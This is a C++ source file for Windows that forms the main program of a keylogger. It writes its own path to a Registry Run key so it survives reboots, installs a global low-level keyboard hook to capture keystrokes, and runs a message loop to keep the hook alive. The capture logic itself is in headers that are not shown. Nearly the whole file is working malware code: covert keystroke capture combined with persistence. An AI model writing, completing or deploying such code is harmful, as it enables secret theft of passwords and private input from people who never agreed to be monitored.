#include <windows.h>
#include <iostream>
#include <keylogger.h>
#include <persistence.h>

#pragma comment(lib, "User32.lib")

int main(int argc, char* argv[]) {
    Keylogger kl(L"VandeVen");
    wchar_t exePath[MAX_PATH];

    if (!getPath(exePath, MAX_PATH)) {
        std::cerr << "Unable to get exe path." << std::endl;
    }

    if (!WriteRegistryRun(exePath)) {
        std::cerr << "Persistence via Registry Run Key failed." << std::endl;
    }

    HHOOK hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        kl.KBHook,
        GetModuleHandle(NULL),
        0
    );

    if (hKeyboardHook == NULL) {
        std::cerr << "Kb Hook Installation Failed: " << GetLastError() << std::endl;
        return 1;
    }
    
    MSG msg;
    BOOL bRet;
    while (bRet = GetMessage(&msg, NULL, 0, 0) != 0) {
        if (bRet == -1) {
            std::cerr << "GetMessage failed: " << GetLastError() << std::endl;
            break;
        } else {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    UnhookWindowsHookEx(hKeyboardHook);

    return 0;
}